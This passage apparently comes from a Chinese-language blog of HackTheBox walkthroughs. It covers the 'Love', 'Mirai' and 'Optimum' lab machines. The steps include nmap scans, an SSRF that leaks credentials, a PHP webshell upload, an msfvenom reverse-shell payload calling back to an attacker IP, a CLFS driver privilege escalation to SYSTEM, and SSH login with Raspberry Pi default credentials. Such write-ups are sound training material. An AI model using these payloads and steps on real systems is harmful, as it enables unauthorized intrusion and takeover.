<span class="token number">3306</span>/tcp  <span class="token function">open</span>  mysql        MariaDB <span class="token number">10.3</span>.24 or later <span class="token punctuation">(</span>unauthorized<span class="token punctuation">)</span>
<span class="token number">5000</span>/tcp  <span class="token function">open</span>  http         Apache httpd <span class="token number">2.4</span>.46 <span class="token punctuation">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.46 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="token operator">|</span>_http-title: <span class="token number">403</span> Forbidden
<span class="token number">5040</span>/tcp  <span class="token function">open</span>  unknown
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http         Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">5986</span>/tcp  <span class="token function">open</span>  ssl/http     Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>LOVE
<span class="token operator">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
<span class="token operator">|</span> Not valid before: <span class="token number">2021</span>-04-11T14:39:19
<span class="token operator">|</span>_Not valid after:  <span class="token number">2024</span>-04-10T14:39:19
<span class="token operator">|</span>_ssl-date: <span class="token number">2025</span>-02-22T03:43:45+00:00<span class="token punctuation">;</span> +4m16s from scanner time.
<span class="token operator">|</span> tls-alpn: 
<span class="token operator">|</span>_  http/1.1
<span class="token number">7680</span>/tcp  <span class="token function">open</span>  pando-pub?
<span class="token number">47001</span>/tcp <span class="token function">open</span>  http         Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49668</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49669</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">49670</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span>_clock-skew: mean: 2h04m17s, deviation: 4h00m02s, median: 4m15s
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2025</span>-02-22T03:43:31
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span> smb-security-mode: 
<span class="token operator">|</span>   account_used: guest
<span class="token operator">|</span>   authentication_level: user
<span class="token operator">|</span>   challenge_response: supported
<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span>
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled but not required
<span class="token operator">|</span> smb-os-discovery: 
<span class="token operator">|</span>   OS: Windows <span class="token number">10</span> Pro <span class="token number">19042</span> <span class="token punctuation">(</span>Windows <span class="token number">10</span> Pro <span class="token number">6.3</span><span class="token punctuation">)</span>
<span class="token operator">|</span>   OS CPE: cpe:/o:microsoft:windows_10::-
<span class="token operator">|</span>   Computer name: Love
<span class="token operator">|</span>   NetBIOS computer name: LOVE<span class="token punctuation">\</span>x00
<span class="token operator">|</span>   Workgroup: WORKGROUP<span class="token punctuation">\</span>x00
<span class="token operator">|</span>_  System time: <span class="token number">2025</span>-02-21T19:43:34-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">282.61</span> seconds
</code></pre>

<p>通过扫描在443 端口发现一个子域名，将<code>love.htb</code>和<code>staging.love.htb</code>添加本地域名解析到hosts文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.239 love.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts
<span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.239 staging.love.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问<code>staging.love.htb</code> 点击Demo 找到一个输入框</p>
<img src="/Hackthebox/htb/htb-love/image-20250222122349377.png" class="" title="访问">

<p>使用Python3 启用一个web服务，在输入框中输入url 然后点击<code>Scan file</code> 发现存在SSRF</p>
<img src="/Hackthebox/htb/htb-love/image-20250222123810029.png" class="" title="SSRF">

<p>依次探测开放端口，发现在5000端口可以读取到凭证</p>
<img src="/Hackthebox/htb/htb-love/image-20250222130122775.png" class="" title="内网探测">

<p>对<code>love.htb</code>和<code>staging.love.htb</code> 目录进行fuzz 发现<code>love.htb</code> 有个admin页面，使用获取到的帐号密码登录，点击Votes，上传php木马</p>
<img src="/Hackthebox/htb/htb-love/image-20250222131025885.png" class="" title="文件上传">

<p>使用蚁剑连接shell</p>
<img src="/Hackthebox/htb/htb-love/image-20250222142215068.png" class="" title="Getshell">

<img src="/Hackthebox/htb/htb-love/image-20250222133719719.png" class="" title="upload">

<p>将shell从蚁剑转到msfconsole：生成后门，然后使用蚁剑上传文件并执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成payload</span>
msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.10</span>.16.30 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token operator">></span> shell.exe 
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="token number">510</span> bytes
Final size of exe file: <span class="token number">7168</span> bytes
<span class="token comment"># 接收反弹shell</span>
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.239
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4444 -<span class="token operator">></span> <span class="token number">10.10</span>.10.239:52670<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 <span class="token number">13</span>:43:06 +0800
meterpreter <span class="token operator">></span> getuid 
Server username: LOVE<span class="token punctuation">\</span>Phoebe</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>multi/recon/local_exploit_suggester</code>  收集信息为提权做准备</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> run
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - Collecting <span class="token builtin class-name">local</span> exploits <span class="token keyword">for</span> x64/windows<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - <span class="token number">203</span> exploit checks are being tried<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/always_install_elevated: The target is vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> 20H2 build detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: <span class="token number">10.0</span>.19042.0 <span class="token function">which</span> has a vulnerable version of clfs.sys installed by default
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows <span class="token number">10</span> version 20H2
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The <span class="token function">service</span> is running, but could not be validated.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running check method <span class="token keyword">for</span> exploit <span class="token number">48</span> / <span class="token number">48</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.239 - Valid modules <span class="token keyword">for</span> session <span class="token number">1</span>:
</code></pre>

<p>查看系统版本为19042，使用<code>exploit/windows/local/cve_2023_28252_clfs_driver</code> 进行权限提升</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> sysinfo 
Computer        <span class="token builtin class-name">:</span> LOVE
OS              <span class="token builtin class-name">:</span> Windows <span class="token number">10</span> <span class="token punctuation">(</span><span class="token number">10.0</span> Build <span class="token number">19042</span><span class="token punctuation">)</span>.
Architecture    <span class="token builtin class-name">:</span> x64
System Language <span class="token builtin class-name">:</span> en_US
Domain          <span class="token builtin class-name">:</span> WORKGROUP
Logged On Users <span class="token builtin class-name">:</span> <span class="token number">2</span>
Meterpreter     <span class="token builtin class-name">:</span> x64/windows</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2023_28252_clfs_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2023_28252_clfs_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2023_28252_clfs_driver<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. The target is running windows version: <span class="token number">10.0</span>.19042.0 <span class="token function">which</span> has a vulnerable version of clfs.sys installed by default
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching netsh to <span class="token function">host</span> the DLL<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Process <span class="token number">3976</span> launched.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reflectively injecting the DLL into <span class="token number">3976</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Exploit finished, <span class="token function">wait</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>hopefully privileged<span class="token punctuation">)</span> payload execution to complete.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.239
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4444 -<span class="token operator">></span> <span class="token number">10.10</span>.10.239:52672<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 <span class="token number">13</span>:55:57 +0800

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\Phoebe\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Mirai</title>
    <url>/Hackthebox/htb/htb-mirai/</url>
    <content><![CDATA[<style>.ddcsolrrniqd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="ddcsolrrniqd">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.48 <span class="token parameter variable">-sV</span>  <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-02 <span class="token number">11</span>:57 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.48
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65343</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, <span class="token number">186</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE VERSION
<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">6</span>.7p1 Debian <span class="token number">5</span>+deb8u3 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">1024</span> aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">2048</span> e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain  dnsmasq <span class="token number">2.76</span>
<span class="token operator">|</span> dns-nsid: 
<span class="token operator">|</span>_  bind.version: dnsmasq-2.76
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http    lighttpd <span class="token number">1.4</span>.35
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: lighttpd/1.4.35
<span class="token number">1686</span>/tcp  <span class="token function">open</span>  upnp    Platinum UPnP <span class="token number">1.0</span>.5.13 <span class="token punctuation">(</span>UPnP/1.0 DLNADOC/1.50<span class="token punctuation">)</span>
<span class="token number">32400</span>/tcp <span class="token function">open</span>  http    Plex Media Server httpd
<span class="token operator">|</span>_http-title: Unauthorized
<span class="token operator">|</span>_http-cors: HEAD GET POST PUT DELETE OPTIONS
<span class="token operator">|</span> http-auth: 
<span class="token operator">|</span> HTTP/1.1 <span class="token number">401</span> Unauthorized<span class="token punctuation">\</span>x0D
<span class="token operator">|</span>_  Server returned status <span class="token number">401</span> but no WWW-Authenticate header.
<span class="token operator">|</span>_http-favicon: Plex
<span class="token number">32469</span>/tcp <span class="token function">open</span>  upnp    Platinum UPnP <span class="token number">1.0</span>.5.13 <span class="token punctuation">(</span>UPnP/1.0 DLNADOC/1.50<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">122.17</span> seconds</code></pre>

<p>添加本地域名解析到hosts</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.48 mirai.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<p>访问目标 <a href="http://mirai.htb/">http://mirai.htb</a> ,右键查看源码，找到一个路径</p>
<img src="/Hackthebox/htb/htb-mirai/image-20250302122107403.png" class="" title="源码">访问/admin 可以看到是树苺派

<img src="/Hackthebox/htb/htb-mirai/image-20250302122612935.png" class="" title="面板">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用树苺派默认凭证 pi:raspberry 登录SSH</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> pi@mirai.htb              
The authenticity of <span class="token function">host</span> <span class="token string">'mirai.htb (10.10.10.48)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>mirai.htb<span class="token string">' (ED25519) to the list of known hosts.
pi@mirai.htb'</span>s password: 

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug <span class="token number">27</span> <span class="token number">14</span>:47:50 <span class="token number">2017</span> from localhost

SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.


SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.

pi@raspberrypi:~ $ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,20<span class="token punctuation">(</span>dialout<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,60<span class="token punctuation">(</span>games<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span>,101<span class="token punctuation">(</span>input<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,117<span class="token punctuation">(</span>i2c<span class="token punctuation">)</span>,998<span class="token punctuation">(</span>gpio<span class="token punctuation">)</span>,999<span class="token punctuation">(</span>spi<span class="token punctuation">)</span>
</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>运行sudo -l 可以看到能直接切换root用户，查看root.txt 提示备份在USB stick</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pi@raspberrypi:~ $ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> pi on localhost:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User pi may run the following commands on localhost:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL
pi@raspberrypi:~ $ <span class="token function">sudo</span> <span class="token parameter variable">-i</span>

SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.


SSH is enabled and the default password <span class="token keyword">for</span> the <span class="token string">'pi'</span> user has not been changed.
This is a security risk - please login as the <span class="token string">'pi'</span> user and <span class="token builtin class-name">type</span> <span class="token string">'passwd'</span> to <span class="token builtin class-name">set</span> a new password.

root@raspberrypi:~<span class="token comment"># ls</span>
root.txt
root@raspberrypi:~<span class="token comment"># cat root.txt </span>
I lost my original root.txt<span class="token operator">!</span> I think I may have a backup on my USB stick<span class="token punctuation">..</span>.
root@raspberrypi:~<span class="token comment"># </span></code></pre>

<p>查看驱动清单，进入&#x2F;media&#x2F;usbstick，查看 damnit.txt </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@raspberrypi:/<span class="token comment"># df -hl</span>
Filesystem      Size  Used Avail Use% Mounted on
aufs            <span class="token number">8</span>.5G  <span class="token number">2</span>.8G  <span class="token number">5</span>.3G  <span class="token number">34</span>% /
tmpfs           100M  <span class="token number">4</span>.8M   96M   <span class="token number">5</span>% /run
/dev/sda1       <span class="token number">1</span>.3G  <span class="token number">1</span>.3G     <span class="token number">0</span> <span class="token number">100</span>% /lib/live/mount/persistence/sda1
/dev/loop0      <span class="token number">1</span>.3G  <span class="token number">1</span>.3G     <span class="token number">0</span> <span class="token number">100</span>% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     <span class="token number">0</span>  250M   <span class="token number">0</span>% /lib/live/mount/overlay
/dev/sda2       <span class="token number">8</span>.5G  <span class="token number">2</span>.8G  <span class="token number">5</span>.3G  <span class="token number">34</span>% /lib/live/mount/persistence/sda2
devtmpfs         10M     <span class="token number">0</span>   10M   <span class="token number">0</span>% /dev
tmpfs           250M  <span class="token number">8</span>.0K  250M   <span class="token number">1</span>% /dev/shm
tmpfs           <span class="token number">5</span>.0M  <span class="token number">4</span>.0K  <span class="token number">5</span>.0M   <span class="token number">1</span>% /run/lock
tmpfs           250M     <span class="token number">0</span>  250M   <span class="token number">0</span>% /sys/fs/cgroup
tmpfs           250M  <span class="token number">8</span>.0K  250M   <span class="token number">1</span>% /tmp
/dev/sdb        <span class="token number">8</span>.7M   93K  <span class="token number">7</span>.9M   <span class="token number">2</span>% /media/usbstick
tmpfs            50M     <span class="token number">0</span>   50M   <span class="token number">0</span>% /run/user/999
tmpfs            50M     <span class="token number">0</span>   50M   <span class="token number">0</span>% /run/user/1000
root@raspberrypi:/<span class="token comment"># cd /media/usbstick</span>
root@raspberrypi:/media/usbstick<span class="token comment"># ls</span>
damnit.txt  lost+found

root@raspberrypi:/media/usbstick<span class="token comment"># cat damnit.txt </span>
Damnit<span class="token operator">!</span> Sorry <span class="token function">man</span> I accidentally deleted your files off the USB stick.
Do you know <span class="token keyword">if</span> there is any way to get them back?

<span class="token parameter variable">-James</span></code></pre>

<p>使用strings 查看字符串</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@raspberrypi:/media/usbstick<span class="token comment"># strings /dev/sdb </span>
<span class="token operator">></span>r <span class="token operator">&amp;</span>
/media/usbstick
lost+found
root.txt
damnit.txt
<span class="token operator">></span>r <span class="token operator">&amp;</span>
<span class="token operator">></span>r <span class="token operator">&amp;</span>
/media/usbstick
lost+found
root.txt
damnit.txt
<span class="token operator">></span>r <span class="token operator">&amp;</span>
/media/usbstick
<span class="token number">2</span><span class="token punctuation">]</span><span class="token number">8</span>^
lost+found
root.txt
damnit.txt
<span class="token operator">></span>r <span class="token operator">&amp;</span>
3d3e483143ff12ec505d026fa13e020b
Damnit<span class="token operator">!</span> Sorry <span class="token function">man</span> I accidentally deleted your files off the USB stick.
Do you know <span class="token keyword">if</span> there is any way to get them back?
<span class="token parameter variable">-James</span></code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">strings &#x2F;dev&#x2F;sdb</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>默认密码</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Optimum</title>
    <url>/Hackthebox/htb/htb-optimum/</url>
    <content><![CDATA[<style>.nhjbqatxgfzw{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="nhjbqatxgfzw">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-optimum/image-20250202180408340.png" class="" title="nmap">

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问目标</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223205864.png" class="" title="获取版本信息">

<p>使用searchsploit 检索可利用漏洞，发现目标可能存在RCE</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223259584.png" class="" title="searchsploit">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole进行漏洞利用</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223401263.png" class="" title="漏洞利用">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>post/multi/recon/local_exploit_suggester</code>检测下当前系统可利用的提权漏洞</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250203223426591.png" class="" title="收集信息">

